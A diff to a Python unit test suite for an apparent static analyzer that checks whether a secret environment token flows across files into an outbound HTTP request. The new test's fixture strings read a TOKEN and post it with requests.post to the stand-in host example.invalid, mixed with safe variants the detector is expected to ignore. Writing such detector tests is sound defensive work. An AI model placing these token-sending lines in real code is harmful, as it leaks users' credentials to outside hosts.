@@ -23,6 +23,13 @@ class CrossFilePrototypeTests(unittest.TestCase):
         for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post=lambda **kwargs: None\nrequests.post(json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
             self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])
 
+    def test_immediate_variable_flow_and_safe_pairs(self):
+        source='import os\ndef key():\n return os.getenv("TOKEN")\n'
+        prefix='import requests\nfrom settings import key\n'
+        for body,expected in [('value=key()\nrequests.post("https://example.invalid",json={"x":value})',True),('value=key()\nvalue="public"\nrequests.post("https://example.invalid",json=value)',False),('value=key()\nprint(value)',False),('value=key()\nrequests.post("https://example.invalid",headers={"x":value})',False),('value=key()\nrequests.post("https://example.invalid",json={"present":bool(value)})',False),('value=key()\nif flag:\n requests.post("https://example.invalid",json=value)',False)]:
+            with self.subTest(body=body):
+                self.assertEqual(bool(review.analyze({'settings.py':source,'main.py':prefix+body})['findings']),expected)
+
     def test_ambiguous_and_invalid_modules_are_not_treated_as_complete(self):
         result=review.analyze({'settings.py':'def broken(:','pkg.py':'x=1','pkg/__init__.py':'x=2'})
         self.assertEqual(result['parse_failures'],['settings.py'])
